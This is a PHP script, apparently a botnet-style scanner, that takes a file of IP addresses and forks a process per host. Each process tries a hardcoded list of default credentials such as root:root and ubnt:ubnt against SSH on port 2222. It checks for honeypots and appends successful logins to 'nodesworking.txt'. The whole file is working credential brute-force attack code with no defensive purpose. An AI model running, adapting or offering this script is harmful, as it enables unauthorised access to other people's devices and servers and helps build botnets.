<?php
// Dependencies - php-cli php-ssh2
// Recommended Ubuntu 16+
// Installation for dependencies (ubuntu 16+) - apt-get install php-cli php-ssh2 -y

error_reporting(0);
if ($argv[1] == NULL){
  die("Usage: php $argv[0] list.txt\n");
}
$list = $argv[1];
$combos = array(
'admin:admin',
'telnet:telnet',
'login:login',
'root:root',
'root:telnet',
'admin:admin',
'user:user',
'ubnt:ubnt',
'test:test',
'root:password',
'root:support',
'ssh:ssh',
'root lol123',
'usuario:usuario',
'support:support',
'admin:password',
);
foreach(file($list) as $ip) {
  $ip = str_replace(array("\r", "\n"), '', $ip);
    $pid = pcntl_fork();
    if($pid == -1) {
        echo "Forking failed on $i loop of forking.\n";
    } elseif($pid) {
        continue;
    } else {
        foreach($combos as $combo) {
          if (!function_exists("ssh2_connect")) die("Install ssh2");
          $parts = explode(":", $combo);
          $combouser = $parts[0];
          $combopass = $parts[1];
      if(!($con = ssh2_connect($ip, 2222))){
          die("[!] Bot Broke\n");
      } else {
          if(!ssh2_auth_password($con, $combouser, $combopass)) {
            if ($combouser !== 'honey') {
              echo "[!] $ip Invalid $combo\n";
            }
          } else {
            if (!($stream = ssh2_exec($con, "echo test"))) {
              die("[!] $ip Maybe\n");
            } else {
              if ($combouser === 'honey'){
                die("[!] Bot Broke\n");
              } else {
              echo "[!] Trying $ip with $combo\n";
              fclose($stream);
              $db = fopen("nodesworking.txt", "a"); 
              fwrite($db, "[!] $ip Success My Boi $combo\n");
              fclose($db);
              die("[!] $ip Success $combo\n");
              }
              }
          }
      }
        }
      die();
    }
}
for($j = 0; $j < count(file($list)); $j++) {
    $pid = pcntl_wait($status);
}
?>